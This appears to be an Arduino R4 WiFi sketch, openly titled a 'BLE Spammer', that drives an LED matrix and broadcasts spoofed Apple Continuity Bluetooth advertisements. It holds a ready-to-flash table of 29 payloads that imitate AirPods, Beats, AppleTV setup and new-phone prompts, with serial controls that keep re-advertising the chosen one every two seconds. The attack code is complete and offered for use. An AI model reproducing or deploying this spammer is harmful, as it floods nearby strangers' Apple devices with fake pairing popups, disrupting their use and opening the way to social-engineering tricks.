#include <ArduinoBLE.h>
#include <Arduino_LED_Matrix.h>
#include <string.h>

ArduinoLEDMatrix matrix;

// ── Payloads ─────────────────────────────────────────────────────────────────

const char *payloadNames[] = {
  "Airpods", "Airpods Pro", "Airpods Max", "Airpods Gen 2", "Airpods Gen 3",
  "Airpods Pro Gen2", "PowerBeats", "PowerBeats Pro", "Beats Solo Pro",
  "Beats Studio Bud", "Beats Flex", "BeatsX", "Beats Solo3", "Beats Studio3",
  "Beats Studio Pro", "Beats Fit Pro", "Beats Stud Bud+", "AppleTV Setup",
  "AppleTV Pair", "AppleTV New User", "AppleTV AppleID", "AppleTV Audio",
  "AppleTV Homekit", "AppleTV Keybd", "AppleTV Network",
  "Homepod Setup", "Setup New Phone", "Transfer Number", "TV Color Bal"
};

const uint8_t payloads[][29] = {
  {0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
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  {0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x1e,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
};

const int NUM_PAYLOADS = 29;
int broadcastOption = 0;
bool isSpamming = false;
BLEAdvertisingData advData;

// letters i guess 
// ABCDEFGHIJKLMNOPQRSTUVWXYZ + 0123456789

const uint8_t FONT4[36][4] = {
  {0x0C,0x12,0x1E,0x12}, // A
  {0x1C,0x12,0x1C,0x1E}, // B
  {0x0E,0x10,0x10,0x0E}, // C
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  {0x0C,0x1E,0x02,0x0C}, // 9
};

// ── Helpers police ───────────────────────────────────────────────────────────

int charIndex(char c) {
  c = toupper(c);
  if (c >= 'A' && c <= 'Z') return c - 'A';
  if (c >= '0' && c <= '9') return 26 + (c - '0');
  return -1; // espace ou inconnu → colonne vide
}


uint8_t getColumn(const char* text, int col) {
  const int CHAR_W = 5; 
  int charPos   = col / CHAR_W;
  int colInChar = col % CHAR_W;
  if (charPos >= (int)strlen(text)) return 0;
  if (colInChar == 4) return 0;
  int idx = charIndex(text[charPos]);
  if (idx < 0) return 0;

  uint8_t raw = FONT4[idx][colInChar] & 0x1F;
  return raw << 1; 
}

// ── scrollText ───────────────────────────────────────────────────────────────


void setPixel(uint32_t frame[3], int col, int row) {
  if (col < 0 || col > 11 || row < 0 || row > 7) return;
  int bitPos    = row * 12 + col;
  int wordIdx   = bitPos / 32;
  int bitInWord = 31 - (bitPos % 32);
  frame[wordIdx] |= (1UL << bitInWord);
}

void scrollText(const char* text) {
  int textLen   = strlen(text);
  int totalCols = textLen * 5 + 12; 

  uint32_t frame[3];

  for (int offset = -12; offset < totalCols; offset++) {
    frame[0] = frame[1] = frame[2] = 0;

    for (int col = 0; col < 12; col++) {
      int srcCol = offset + col;
      if (srcCol < 0) continue;
      uint8_t colData = getColumn(text, srcCol);
      // colData : bit7=ligne0 .. bit0=ligne7
      for (int row = 0; row < 8; row++) {
        if (colData & (0x80 >> row)) {
          setPixel(frame, col, row);
        }
      }
    }

    matrix.loadFrame(frame);
    delay(80); 
  }
}

// ── showArrow ────────────────────────────────────────────────────────────────

void showArrow() {
  uint32_t frame[3] = {0, 0, 0};
 
  for (int c = 1; c <= 9; c++) {
    setPixel(frame, c, 3);
    setPixel(frame, c, 4);
  }
  
  setPixel(frame, 10, 2); setPixel(frame, 10, 3); setPixel(frame, 10, 4); setPixel(frame, 10, 5);
  setPixel(frame, 11, 1); setPixel(frame, 11, 2); setPixel(frame, 11, 3);
  setPixel(frame, 11, 4); setPixel(frame, 11, 5); setPixel(frame, 11, 6);
  matrix.loadFrame(frame);
  delay(800);
  matrix.clear();
}

// ── BLE ──────────────────────────────────────────────────────────────────────

void startBLE() {
  BLE.setLocalName("");
  advData.setManufacturerData(payloads[broadcastOption], 29);
  BLE.setAdvertisingData(advData);
  BLE.advertise();
}

void stopBLE() {
  BLE.stopAdvertise();
}

// ── Utilitaires ──────────────────────────────────────────────────────────────

void printCurrentPayload() {
  Serial.print("Payload [");
  Serial.print(broadcastOption);
  Serial.print("] : ");
  Serial.println(payloadNames[broadcastOption]);
}

void updateMatrix() {
  if (isSpamming) {
    matrix.loadFrame(LEDMATRIX_EMOJI_HAPPY);
    delay(400);
  }
  scrollText(payloadNames[broadcastOption]);
}

// ── setup / loop ──────────────────────────────────────────────────────────────

void setup() {
  Serial.begin(115200);
  matrix.begin();
  showArrow();

  if (!BLE.begin()) {
    Serial.println("BLE failed !");
    while (1) {
      matrix.loadFrame(LEDMATRIX_EMOJI_SAD);
      delay(500);
      matrix.clear();
      delay(500);
    }
  }

  Serial.println("=== BLE Spammer - Arduino R4 WiFi ===");
  Serial.println("u = next payload");
  Serial.println("d = previous payload");
  Serial.println("m = start/stop spam");
  Serial.println("l = list all payload");
  Serial.println("=====================================");
  printCurrentPayload();
  updateMatrix();
}

void loop() {
  if (Serial.available()) {
    char cmd = Serial.read();
    switch (cmd) {
      case 'u':
        if (broadcastOption < NUM_PAYLOADS - 1) {
          broadcastOption++;
          printCurrentPayload();
          updateMatrix();
        }
        break;
      case 'd':
        if (broadcastOption > 0) {
          broadcastOption--;
          printCurrentPayload();
          updateMatrix();
        }
        break;
      case 'm':
        isSpamming = !isSpamming;
        if (isSpamming) {
          Serial.println(">> SPAMMER ON");
          startBLE();
        } else {
          Serial.println(">> SPAMMER OFF");
          stopBLE();
        }
        updateMatrix();
        break;
      case 'l':
        for (int i = 0; i < NUM_PAYLOADS; i++) {
          Serial.print(i == broadcastOption ? " > [" : "   [");
          Serial.print(i);
          Serial.print("] ");
          Serial.println(payloadNames[i]);
        }
        break;
    }
  }

  if (isSpamming) {
    static unsigned long lastSpam = 0;
    if (millis() - lastSpam > 2000) {
      lastSpam = millis();
      BLE.stopAdvertise();
      delay(50);
      startBLE();
    }
  }
}
